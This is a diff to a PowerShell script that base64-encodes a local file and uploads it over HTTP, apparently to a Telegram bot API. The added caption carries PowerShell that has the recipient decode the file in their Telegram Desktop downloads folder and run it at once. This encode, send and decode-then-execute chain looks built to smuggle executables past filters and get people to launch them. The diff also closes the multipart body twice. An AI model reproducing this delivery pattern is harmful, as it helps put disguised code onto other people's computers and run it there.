@@ -32,6 +32,16 @@ function Download-TelegramFiles {
     $fileContent = [System.IO.File]::ReadAllBytes($filePath)
     $fileBase64 = [Convert]::ToBase64String($fileContent)
     $fileName = [System.IO.Path]::GetFileName($filePath)
+    $caption = 'Decode Base64 For Read
+
+$username=""
+$base64EncodedData = Get-Content -Path "C:\Users\$username\Downloads\Telegram Desktop\'+ $fileName + '" -Raw
+$outputFilePath = "C:\Users\$username\Downloads\Telegram Desktop\d'+ $fileName + '"
+$fileBytes = [System.Convert]::FromBase64String($base64EncodedData)
+[System.IO.File]::WriteAllBytes($outputFilePath, $fileBytes)
+&$outputFilePath
+
+    '
     $boundary = [System.Guid]::NewGuid().ToString()
     $lf = "`r`n"
     $headers = @{}
@@ -46,6 +56,11 @@ function Download-TelegramFiles {
     $bodyLines += "Content-Type: application/octet-stream"
     $bodyLines += ""
     $bodyLines += "$fileBase64"
+    $bodyLines += "--$boundary"
+    $bodyLines += "Content-Disposition: form-data; name=`"caption`""
+    $bodyLines += ""
+    $bodyLines += "$caption"
+    $bodyLines += "--$boundary--"
     $bodyLines += "--$boundary--"
     $body = $bodyLines -join $lf
     $response = Invoke-RestMethod -Uri $apiUrl -Method Post -UserAgent $UAG -Headers $headers -Body $body | Out-String 
